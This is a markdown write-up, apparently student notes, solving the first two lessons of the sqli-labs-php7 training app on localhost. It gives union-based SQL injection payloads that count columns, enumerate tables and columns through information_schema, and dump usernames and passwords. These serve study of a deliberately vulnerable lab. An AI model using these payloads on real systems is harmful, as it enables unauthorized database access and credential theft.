# Web Exploitation

## SQLI Lab Challenges

### Lesson 1

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/4.jpeg?raw=true)

- We can see that its asking us to **Input the **ID as parameter with Numeric value**.
- Now injecting it with **?id=x** we will get different **Username** and **Password** where **x** is any positive number.

```
http://localhost/sqli-labs-php7/Less-1/?id=1
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/5.jpeg?raw=true)

- Now if we inject with **?id='** the query will be breaked and we will get an error.

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/6.jpeg?raw=true)

```
http://localhost/sqli-labs-php7/Less-1/?id=1%27
```

- The error is '''' LIMIT 0,1' Here we can remove the first and last ' since they indicates the error statement. 
- Now it becomes ''' LIMIT 0,1 the input we give will go between ''. Hence, we need to dump the data with a single quoted query.

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' LIMIT 0,1' at line 1
```

- The error is '''' LIMIT 0,1' Here we can remove the first and last ' since they indicates the error statement. 
- Now it becomes ''' LIMIT 0,1 the input we give will go between ''. 
- So remove the **' '** from the query.
- Finally  we are left with single Query.
- Hence, we need to dump the data with a single quoted query.
- If we give **?id=1'** we cant dump the data because the statement becomes **True**. 
- So we need to give a false value and union it with the right query dump the statement. 
- Giving negative value makes the value **False**.

```
http://localhost/sqli-labs-php7/Less-1/?id=-1' union select 1-- -
```

- Next step is to find **Number of Columns**.
- To do that try with different values untill we get a correct one.

```
The used SELECT statements have a different number of columns 
```

- It means that the number of columns which we assumed is not correct. 
- Now if we try with 

```
http://localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,2,3-- - 
```

we will get Login name:2 Your Password:3 signifying that the required number of attributes is correct.


![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/1.jpeg?raw=true)

- We shall find what database has all the data of usernames and passwords.
- We shall give the query as ?id=-1’ union select 1,database(),version()-- -

```
http://localhost/sqli-labs-php7/Less-1/?id=-1%27%20union%20select%201,database(),version()%20--%20
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/2.jpeg?raw=true)

- Now we need to figure out table, column to dump usernames and passwords.
- In the database we can find that TABLES contain all the data. 
- TABLES contains attribute TABLE_SCHEMA that have database names and TABLE_NAME have names of all tables.
- Now if we give 

```
http://localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES where TABLE_SCHEMA = database()-- - 
```
we shall get all the tables in the database.

- We need to find the names of attributes now. 
- We can do that using 

```
http://localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'users'-- - 
```
we will get id,username,password.

- Now we need to find the database in which the data usernames and password lies. 
- We can get that using 

```
http://localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,2, database ()-- -.
```
- We will get security as the result for database(). 
- **database()** is a function in mysql that returns the current database. 

```
--> The Final Query that Dumps the Database is,

http://localhost/sqli-labs-php7/Less-1/?id=-1%27union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--%20-
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/3.jpeg?raw=true)

### Lesson 2

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/7.jpeg?raw=true)

- We can see that its asking us to **Input the **ID as parameter with Numeric value**.
- Now injecting it with **?id=x** we will get different **Username** and **Password** where **x** is any positive number.

```
http://localhost/sqli-labs-php7/Less-2/?id=1
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/8.jpeg?raw=true)

- Now if we inject with **?id='** the query will be breaked and we will get an error.

```
http://localhost/sqli-labs-php7/Less-2/?id=
```

- The error is '' LIMIT 0,1' Here we can remove the first and last ' since they indicates the error statement. 
- Now it becomes ' LIMIT 0,1 the input we give will go between ''. Hence, we need to dump the data with a without a query

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT 0,1' at line 1
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/9.jpeg?raw=true)

- The error is **'LIMIT 0,1'** Here we can remove the first and last ' since they indicates the error statement. 
- So we are left with LIMIT 0,1
- Its a integer based error dumping.
- If we give **?id=1** we cant dump the data because the statement becomes **True**. 
- So we need to give a false value and union it with the right query dump the statement. 
- Giving negative value makes the value **False**.

```
http://localhost/sqli-labs-php7/Less-2/?id=-1 union select 1-- -
```

- Next step is to find **Number of Columns**.
- To do that try with different values untill we get a correct one.

```
The used SELECT statements have a different number of columns 
```

- It means that the number of columns which we assumed is not correct. 
- Now if we try with 

```
http://localhost/sqli-labs-php7/Less-2/?id=-1 union select 1,2,3-- - 
```

we will get Login name:2 Your Password:3 signifying that the required number of attributes is correct.

- We shall find what database has all the data of usernames and passwords.
- We shall give the query as ?id=-1’ union select 1,database(),version()-- -

```
http://localhost/sqli-labs-php7/Less-2/?id=-1%20union%20select%201,database(),version()%20--%20
```

- Now we need to figure out table, column to dump usernames and passwords.
- In the database we can find that TABLES contain all the data. 
- TABLES contains attribute TABLE_SCHEMA that have database names and TABLE_NAME have names of all tables.
- Now if we give 

```
http://localhost/sqli-labs-php7/Less-2/?id=-1 union select 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES where TABLE_SCHEMA = database()-- - 
```
we shall get all the tables in the database.

- We need to find the names of attributes now. 
- We can do that using 

```
http://localhost/sqli-labs-php7/Less-2/?id=-1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'users'-- - 
```
we will get id,username,password.

- Now we need to find the database in which the data usernames and password lies. 
- We can get that using 

```
http://localhost/sqli-labs-php7/Less-2/?id=-1 union select 1,2, database ()-- -.
```
- We will get security as the result for database(). 
- **database()** is a function in mysql that returns the current database. 

```
--> The Final Query that Dumps the Database is,

http://localhost/sqli-labs-php7/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20users%20--%20-
```

![](https://github.com/abhishekabi2002/Bi0s/blob/master/Web%20Exploitation/Assets/10.jpeg?raw=true)



#### References --> https://github.com/skyblueee/sqli-labs-php7/
